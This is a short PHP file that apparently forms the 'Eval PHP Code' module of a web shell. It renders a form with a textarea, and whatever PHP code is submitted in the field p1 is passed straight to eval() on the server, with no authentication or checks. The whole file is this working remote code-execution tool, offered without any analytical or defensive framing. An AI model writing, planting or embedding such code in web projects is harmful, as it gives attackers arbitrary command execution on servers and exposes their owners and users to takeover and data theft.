<?php
function p($str){
	echo $str."\n";
}

function formhead($arg = array()) {
	!isset($arg['method']) && $arg['method'] = 'post';
	!isset($arg['name']) && $arg['name'] = 'form1';
	$arg['extra'] = isset($arg['extra']) ? $arg['extra'] : '';
	$arg['onsubmit'] = isset($arg['onsubmit']) ? "onsubmit=\"$arg[onsubmit]\"" : '';
	p("<form name=\"$arg[name]\" id=\"$arg[name]\" action=\"".SELF."\" method=\"$arg[method]\" $arg[onsubmit] $arg[extra]>");
	if (isset($arg['title'])) {
		p('<h2>'.$arg['title'].' &raquo;</h2>');
	}
}

function maketext($arg = array()){
	$arg['title'] = isset($arg['title']) ? $arg['title'].'<br />' : '';
	$arg['name'] = isset($arg['name']) ? $arg['name'] : '';
	p("<p>$arg[title]<textarea class=\"area\" id=\"$arg[name]\" name=\"$arg[name]\" cols=\"100\" rows=\"25\">$arg[value]</textarea></p>");
}

$phpcode = trim($p1);
if($phpcode){
	if (!preg_match('#<\?#si', $phpcode)) {
		$phpcode = "<?php\n\n{$phpcode}\n\n?>";
	}
	eval("?".">$phpcode<?");
}

formhead(array('title'=>'Eval PHP Code', 'onsubmit'=>'g(\'eval\',null,this.p1.value);return false;'));
maketext(array('title'=>'PHP Code','name'=>'p1', 'value'=>$phpcode));
?>